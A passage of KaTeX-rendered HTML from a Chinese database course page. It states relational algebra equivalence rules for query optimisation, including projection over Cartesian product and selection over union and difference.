class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></li></ul><h5 id="%E5%AE%9A%E7%90%86l7%3A%E6%8A%95%E5%BD%B1%E5%92%8C%E7%A7%AF%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L7:投影和积的交换律</h5><p>设<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>为俩关系的代数表达式，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">A_1,...A_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是出现在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中的一些属性，其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">B_1,..B_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>出现在中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，剩余的属性<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>C</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">C_1,..C_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">..</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>出现在<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>中，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>π</mi><mrow><msub><mi>B</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>B</mi><mi>m</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>×</mo><msub><mi>π</mi><mrow><msub><mi>C</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>c</mi><mi>k</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi_{A_1..A_n}(E_1\times E_2)\equiv \pi_{B_1,..B_m}(E_1)\times \pi_{C_1,..c_k}(E_2))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0502em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0502em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0715em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span></span></span></eqn></section></p><h5 id="%E5%AE%9A%E7%90%86l8%3A%E9%80%89%E6%8B%A9%E5%92%8C%E5%B9%B6%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L8:选择和并的交换律</h5><p>设关系代数表达式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><msub><mi>E</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E=E_1\cup E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq>是条件，则有：<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∪</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{F}(E_1\cup E_2)\equiv \sigma_F(E_1) \cup \sigma_F(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></p><h5 id="%E5%AE%9A%E7%90%86l9%3A%E9%80%89%E6%8B%A9%E5%92%8C%E5%B7%AE%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L9:选择和差的交换律</h5><p>设关系代数表达式<eq><span class="katex"><span class="katex-mathml"><math 